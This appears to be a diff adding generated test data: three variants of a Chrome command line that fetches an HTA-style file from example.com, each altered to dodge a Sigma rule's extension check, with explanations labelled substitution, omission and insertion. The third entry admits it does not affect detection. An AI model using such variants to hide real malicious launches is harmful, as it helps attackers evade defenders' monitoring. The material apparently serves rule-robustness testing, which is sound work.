@@ -1,0 +1,14 @@
+[
+  {
+    "output": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --minimized http://example.com/app.txt",
+    "explanation": "Substitution: Replaced the suspicious file extension '.hta' with a benign '.txt' to avoid triggering the Sigma rule's extension check."
+  },
+  {
+    "output": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --minimized http://example.com/app",
+    "explanation": "Omission: Removed the file extension from the URL to avoid matching the Sigma rule's extension-based detection."
+  },
+  {
+    "output": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --minimized http://example.com/app.hta --safe-mode",
+    "explanation": "Insertion: Added a harmless '--safe-mode' flag to the command line, which does not affect the Sigma rule's detection logic but alters the command line structure."
+  }
+]
